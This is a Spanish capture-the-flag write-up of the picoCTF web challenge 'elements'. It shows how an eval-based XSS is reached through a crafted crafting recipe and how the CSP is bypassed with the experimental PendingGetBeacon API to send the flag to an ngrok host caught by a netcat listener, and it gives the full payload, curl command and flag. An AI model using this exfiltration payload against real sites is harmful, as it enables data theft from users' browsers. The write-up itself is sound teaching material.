# Writeup: elements
**Categoría:** Hard
**Fecha de conversión:** 2026-04-24

---

Writeup: elements (picoCTF)

Índice


```
    Descripción del reto

    Análisis del código fuente

    Identificación de la vulnerabilidad

    Construcción de la receta

    Preparación del entorno de exfiltración

    Envío del exploit

    Obtención de la flag

    Comandos finales

    Lecciones aprendidas

```

Descripción del reto


El reto elements presenta un servidor web que implementa un juego de combinación de elementos (similar a Infinite Craft). El servidor lanza un navegador Chromium headless que visita una URL controlada por el usuario, inyectando la flag en el estado de la aplicación. El objetivo es lograr que el navegador ejecute código JavaScript arbitrario para extraer la flag.

### Análisis del código fuente


Se nos proporciona un archivo elements.tar.gz. Los archivos más importantes son:


```
    index.mjs: servidor Node.js.

    index.js: cliente (el juego).

    Dockerfile, docker-compose.yml: para ejecutar el entorno.

    policy.json: restringe el navegador a solo 127.0.0.1:8080.

```

Servidor (index.mjs)


```
    Endpoint /remoteCraft recibe un JSON con recipe (array de combinaciones) y xss (string <300 chars).

    Función visit(state):

        Inyecta la flag en state.flag.

        Lanza Chromium con:

            --no-sandbox

            --js-flags=--noexpose_wasm,--jitless

            --enable-experimental-web-platform-features

            http://127.0.0.1:8080/#${base64(JSON.stringify(state))}

        Espera 10 segundos y mata el proceso.

    CSP (Content-Security-Policy):

        default-src 'none'

        script-src 'unsafe-eval' 'self'

        style-src 'unsafe-inline'

        Si el Host no es 127.0.0.1:8080, añade connect-src https://elements.attest.lol/.

```

Cliente (index.js)


```
    Juego de combinaciones: cada par de elementos produce un nuevo elemento según una lista fija de recipes.

    Cuando se combinan dos elementos, se busca en recipes. Si el resultado es "XSS" y existe state.xss, se ejecuta eval(state.xss).

    El state se recupera del fragmento de la URL (location.hash).

    Los elementos básicos son: Fire, Water, Earth, Air.

```

Identificación de la vulnerabilidad


La vulnerabilidad es clara: podemos controlar state.xss y, si logramos que el juego genere el elemento XSS (combinando Exploit y Web Design), nuestro código se ejecutará en el contexto del navegador headless.


Problema: La CSP bloquea fetch, XMLHttpRequest, etc. Sin embargo, el navegador se lanza con --enable-experimental-web-platform-features, lo que activa APIs experimentales como PendingGetBeacon. Esta API permite enviar peticiones GET y no está cubierta por connect-src, por lo que podemos exfiltrar la flag a un servidor externo.


Payload objetivo:

javascript


(new PendingGetBeacon('https://nuestro-servidor/?flag=' + encodeURIComponent(state.flag))).sendNow();


Construcción de la receta


Necesitamos una secuencia de combinaciones que, partiendo de los 4 elementos básicos, llegue a Exploit y Web Design, y finalmente los combine para obtener XSS. Analizando el array recipes en index.js, se deduce la siguiente receta (26 pasos, dentro del límite de 50):

json


[

```
  ["Earth","Water","Mud"],
  ["Earth","Fire","Magma"],
  ["Magma","Mud","Obsidian"],
  ["Obsidian","Water","Hot Spring"],
  ["Fire","Water","Steam"],
  ["Fire","Steam","Heat Engine"],
  ["Dust","Heat Engine","Sand"],
  ["Fire","Sand","Glass"],
  ["Electricity","Glass","Computer Chip"],
  ["Earth","Obsidian","Computer Chip"],
  ["Air","Water","Mist"],
  ["Fire","Mist","Fog"],
  ["Brick","Fog","Cloud"],
  ["Cloud","Dust","Rainbow"],
  ["Brick","Rainbow","Colorful Pattern"],
  ["Colorful Pattern","Computer Chip","Graphic Design"],
  ["Brick","Mud","Adobe"],
  ["Adobe","Graphic Design","Web Design"],
  ["Computer Chip","Electricity","Software"],
  ["Glass","Software","Vulnerability"],
  ["Computer Chip","Fire","Data"],
  ["Computer Chip","Steam Engine","Artificial Intelligence"],
  ["Artificial Intelligence","Data","Encryption"],
  ["Encryption","Software","Cybersecurity"],
  ["Cybersecurity","Vulnerability","Exploit"],
  ["Exploit","Web Design","XSS"]
```

]


```
    Nota: Todos los elementos intermedios existen en las recetas predefinidas.

```

Preparación del entorno de exfiltración


Para recibir la flag, necesitamos un servidor accesible desde el contenedor de Chromium. Usaremos netcat para escuchar en un puerto local y ngrok para exponerlo a internet.

Paso 1: Iniciar netcat en el puerto 4444

bash


nc -nvlp 4444


Paso 2: Exponer el puerto con ngrok

bash


ngrok http 4444


Ngrok nos dará una URL pública, por ejemplo: https://kr3s4l4.ngrok.io. Anotamos esa URL.

Paso 3: Crear el archivo payload.json


Creamos un archivo con la receta y el payload, usando nuestra URL de ngrok:

json


{

```
  "recipe": [
    ["Earth","Water","Mud"],
    ["Earth","Fire","Magma"],
    ["Magma","Mud","Obsidian"],
    ["Obsidian","Water","Hot Spring"],
    ["Fire","Water","Steam"],
    ["Fire","Steam","Heat Engine"],
    ["Dust","Heat Engine","Sand"],
    ["Fire","Sand","Glass"],
    ["Electricity","Glass","Computer Chip"],
    ["Earth","Obsidian","Computer Chip"],
    ["Air","Water","Mist"],
    ["Fire","Mist","Fog"],
    ["Brick","Fog","Cloud"],
    ["Cloud","Dust","Rainbow"],
    ["Brick","Rainbow","Colorful Pattern"],
    ["Colorful Pattern","Computer Chip","Graphic Design"],
    ["Brick","Mud","Adobe"],
    ["Adobe","Graphic Design","Web Design"],
    ["Computer Chip","Electricity","Software"],
    ["Glass","Software","Vulnerability"],
    ["Computer Chip","Fire","Data"],
    ["Computer Chip","Steam Engine","Artificial Intelligence"],
    ["Artificial Intelligence","Data","Encryption"],
    ["Encryption","Software","Cybersecurity"],
    ["Cybersecurity","Vulnerability","Exploit"],
    ["Exploit","Web Design","XSS"]
  ],
  "xss": "(new PendingGetBeacon('https://kr3s4l4.ngrok.io/?flag='+encodeURIComponent(state.flag))).sendNow();"
```

}


```
    Asegúrate de reemplazar https://kr3s4l4.ngrok.io por la URL que te haya dado ngrok.

```

Envío del exploit


El servidor del reto está en rhea.picoctf.net con un puerto dinámico (en nuestro caso 50362). Enviamos la petición con curl escapando correctamente el JSON:

bash


curl -G "http://rhea.picoctf.net:50362/remoteCraft" --data-urlencode "recipe=$(cat payload.json)"


Si todo va bien, el servidor responde visiting!. Esto indica que el navegador headless se lanzó y ejecutará nuestro payload.

Obtención de la flag


En la terminal donde ejecutamos nc -nvlp 4444, veremos algo como:

text


GET /?flag=picoCTF%7Blittle_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a%7D%20btw%20contact%20me%20on%20discord%20with%20ur%20solution%20thanks%20%40ehhthing%0A HTTP/1.1

...


La flag está codificada en la URL. La decodificamos con Python:

bash


python3 -c "import urllib.parse; print(urllib.parse.unquote('picoCTF%7Blittle_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a%7D%20btw%20contact%20me%20on%20discord%20with%20ur%20solution%20thanks%20%40ehhthing%0A'))"


Salida:

text


picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a} btw contact me on discord with ur solution thanks @ehhthing


La flag es picoCTF{little_alchemy_was_the_0g_game_does_anyone_rememb3r_9889fd4a}.

Comandos finales (resumen)

bash


```bash
# Terminal 1: Escuchar con netcat
```

nc -nvlp 4444


```bash
# Terminal 2: Exponer con ngrok
```

ngrok http 4444


```bash
# Terminal 3: Crear payload.json (con la URL de ngrok) y enviarlo
```

curl -G "http://rhea.picoctf.net:50362/remoteCraft" --data-urlencode "recipe=$(cat payload.json)"


```bash
# Terminal 1: Decodificar la flag recibida
```

python3 -c "import urllib.parse; print(urllib.parse.unquote('picoCTF%7B**************************************%20btw%20contact%20me%20on%20discord%20with%20ur%20solution%20thanks%20%40ehhthing%0A'))"


Lecciones aprendidas


```
    CSP no es infalible: Las APIs experimentales pueden eludir restricciones de red.

    eval con datos controlados por el usuario es extremadamente peligroso.

    El contexto de un navegador headless puede ser explotado incluso con políticas estrictas si se habilitan características experimentales.

    Exfiltración alternativa: Cuando fetch está bloqueado, buscar APIs de navegación (Beacon, Ping, etc.) puede ser la clave.

```

### Flag final: picoCTF{********************************************}

